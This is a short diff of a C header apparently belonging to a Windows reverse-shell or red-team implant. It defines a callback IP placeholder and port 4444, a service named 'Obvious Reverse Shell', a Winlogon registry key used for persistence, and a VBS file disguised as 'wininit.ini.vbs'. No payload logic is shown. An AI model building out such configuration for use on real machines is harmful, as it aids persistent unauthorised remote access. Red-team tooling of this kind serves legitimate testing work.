@@ -1,8 +1,10 @@
 #ifndef WINCONSTS
 #define WINCONSTS
-#define IP "<IP ADDRESS HERE>" // IP ADDRESS
+#define IP "<IP HERE>" // IP ADDRESS
 #define PORT 4444 // Port number for ^
 #define PROC_NAME "windbg.exe"
+#define SHELL_PATH "C:\\Windows\\System32\\ObviousRedTeamTool.exe"
+#define SERVICE_NAME "Obvious Reverse Shell"
 #define MAIN_REGISTRY "Software\\AppData\\Internal"
 #define ACTIVATE_REGISTRY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
 #define VBS_PATH "C:\\Users\\Public\\wininit.ini.vbs" 
